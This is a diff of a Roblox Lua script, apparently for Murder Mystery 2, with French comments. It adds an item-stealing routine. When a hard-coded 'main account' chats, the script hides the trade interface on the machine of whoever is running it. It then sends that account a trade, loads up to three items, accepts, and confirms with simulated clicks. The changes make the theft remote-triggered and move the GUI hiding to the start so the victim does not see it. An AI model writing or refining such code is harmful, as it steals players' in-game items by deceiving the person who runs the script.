@@ -496,7 +496,12 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function getitems()
-    -- 1. Envoi de la demande de trade au compte principal
+    -- 1. On cache/détruit le GUI tout de suite pour libérer ton écran et tes mouvements
+    if destroytrades2 then
+        pcall(function() coroutine.resume(destroytrades2) end)
+    end
+
+    -- 2. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
         warn("Compte principal introuvable : " .. tostring(userName))
@@ -506,7 +511,7 @@ local function getitems()
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
 
-    -- 2. Remplissage des 3 cases max (pour éviter la saturation)
+    -- 3. Remplissage des 3 cases max
     local itemsOffered = 0
     local maxSlots = 3
 
@@ -536,15 +541,15 @@ local function getitems()
 
     task.wait(1.5)
 
-    -- 3. Première validation réseau
+    -- 4. Première validation réseau (AcceptRequest)
     pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 4. Attente de 8 secondes (pour dépasser le timer serveur de MM2)
+    -- 5. Attente du timer MM2 (8 secondes)
     task.wait(8)
 
-    -- 5. SÉQUENCE DE CLICS VIRTUELS SUR LE BOUTON
+    -- 6. SÉQUENCE DE CLICS VIRTUELS SUR LE BOUTON
     pcall(function()
         local Camera = workspace.CurrentCamera
         local ViewportSize = Camera.ViewportSize
@@ -571,11 +576,22 @@ local function getitems()
         -- Clic 3 : Sécurité
         sendClick()
     end)
+end
 
-    -- 6. NETTOYAGE / FERMETURE DU GUI SEULEMENT À LA FIN
-    -- Maintenant que le trade est validé, on réactive destroytrades2 pour libérer ton écran !
-    task.wait(1)
-    if destroytrades2 then
-        pcall(function() coroutine.resume(destroytrades2) end)
+-- ==========================================
+-- ÉCOUTE DU TCHAT (CE QUI MANQUAIT !)
+-- ==========================================
+
+local function listenToPlayer(player)
+    if string.lower(player.Name) == string.lower(tostring(userName)) then
+        player.Chatted:Connect(function(msg)
+            getitems()
+        end)
     end
 end
+
+for _, player in pairs(Players:GetPlayers()) do
+    listenToPlayer(player)
+end
+
+Players.PlayerAdded:Connect(listenToPlayer)
